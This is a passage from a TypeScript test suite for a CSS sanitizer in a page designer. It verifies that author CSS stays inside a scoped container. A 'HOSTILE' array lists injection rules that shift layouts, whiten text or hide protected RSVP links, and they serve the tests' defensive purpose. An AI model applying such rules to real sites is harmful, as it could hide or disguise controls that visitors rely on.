      expect(scope(`p { ${vector} }`).css, vector).not.toBe("");
    }
  });

  it("R3-m3: columns cannot produce more than 4 columns and a grid shorthand bounds its rows to 2000px", () => {
    for (const vector of ["columns: 1px", "columns: 200px", "columns: 399px", "columns: 10em", "columns: 1px 5", "columns: 1px 0.5em", "grid-template: repeat(24, 1600px) / 1fr", "grid-template: repeat(2, 1100px) / 1fr", "grid: repeat(2, 1100px) / 1fr", "grid-template: 1fr / repeat(2, 1000px)"]) {
      expect(refused(`p { ${vector} }`), vector).toBe(true);
    }
    for (const vector of ["columns: 400px", "columns: 2", "columns: 3 420px", "columns: 1px 4", "columns: 200px 2", "grid-template: repeat(2, 900px) / repeat(2, 700px)", "grid-template: auto 1fr / 1fr 1fr"]) {
      expect(scope(`p { ${vector} }`).css, vector).not.toBe("");
    }
  });
});

describe("scopeCss: the scope is a container that holds only the author's content (F6, PL-131-R4-M1/M2)", () => {
  const SCOPE = ".cdesign-author";
  const HOSTILE = [
    "section{transform:translate(800px)}", ".cdesign-pages{transform:translate(800px)}", ".cdesign-page{padding:400px}", ".cdesign-canvas{margin-left:-400px}", ".cdesign-el{position:absolute;inset:-400px}",
    "*{position:absolute;inset:-400px;z-index:100}", "*{color:#fff}", "div{display:none}", "main{padding:400px}", "article{transform:scale(2)}", "header{position:absolute}",
    ":root{color:red}", "html{font-size:128px}", "body{margin:-400px}", ":root *{color:#fff}", "html body{margin:0}", ".celebration-design{color:#fff}", ".cdesign-dock{display:none}",
    "section:has(a){transform:scale(2)}", "div:has(.rsvp-protected){display:none}", ":is(section,div){padding:400px}", ":where(.cdesign-pages){padding:400px}", "* + *{margin:-400px}",
    "section ~ section{margin:-400px}", "section > *{position:absolute;inset:-400px}", ".rsvp-protected{display:none}", "a.rsvp-protected{color:#fff}", ".cdesign-author{transform:scale(2)}",
    ".cdesign-author *{color:#fff}", "*:hover{transform:scale(2)}", "section::before{content:'';position:absolute;inset:-400px;z-index:100}", "@media (min-width:1px){section{padding:400px}}"
  ];

  it("every rule that survives starts with the container and a descendant combinator", () => {
    for (const css of HOSTILE) {
      const out = scopeCss(css, { scope: SCOPE }).css;
      const selectors = out.replace(/@media[^{]*\{/g, "").split("}").map((chunk) => chunk.split("{")[0] ?? "").filter(Boolean).flatMap((list) => list.split(/,(?![^(]*\))/));
      for (const selector of selectors) expect(selector.trim().startsWith(`${SCOPE} `), `${css} -> ${selector}`).toBe(true);
    }
  });

  it("no surviving selector matches the root, main, a page, the canvas, a grid item, the container itself or a protected block, in a real DOM", () => {
    document.body.innerHTML = `<article class="celebration celebration-design"><div class="cdesign-dock rsvp-protected"><a class="rsvp-protected" href="/x">x</a></div>
      <main class="cdesign-pages"><section class="cdesign-page"><h2 class="cdesign-page-title">t</h2><div class="cdesign-intro"><p>i</p></div><div class="cdesign-canvas">
      <div class="cdesign-el rsvp-protected"><a class="celebration-cta" href="/r">regalos</a></div>
      <div class="cdesign-el"><div class="cdesign-author"><p>texto</p><div><span>x</span></div></div></div></div></section><header class="cdesign-page"><div class="cdesign-canvas"><div class="cdesign-el"><div class="cdesign-author"><h1>h</h1></div></div></div></header></main></article>`;
    const protectedNodes = [document.documentElement, document.body, ...document.querySelectorAll("article, main, section, header, h2, .cdesign-intro, .cdesign-intro p, .cdesign-canvas, .cdesign-el, .cdesign-author, .cdesign-dock, .cdesign-dock a, .rsvp-protected, .rsvp-protected a")];
    const inside = [...document.querySelectorAll(".cdesign-author p, .cdesign-author div, .cdesign-author span, .cdesign-author h1")];
    let reachable = 0;
    for (const css of HOSTILE) {
      const out = scopeCss(css, { scope: SCOPE }).css;
      const selectors = out.replace(/@media[^{]*\{/g, "").split("}").map((chunk) => chunk.split("{")[0] ?? "").filter(Boolean).flatMap((list) => list.split(/,(?![^(]*\))/)).map((item) => item.trim());
      for (const selector of selectors) {
        let matches: Element[] = [];
        try { matches = [...document.querySelectorAll(selector)]; } catch { continue; }
        for (const node of matches) { expect(protectedNodes.includes(node), `${css} -> ${selector} reaches <${node.tagName.toLowerCase()} class="${node.className}">`).toBe(false); }
        reachable += matches.filter((node) => inside.includes(node)).length;
      }
    }
    expect(reachable, "the container's own content is still reachable").toBeGreaterThan(0);
  });
});
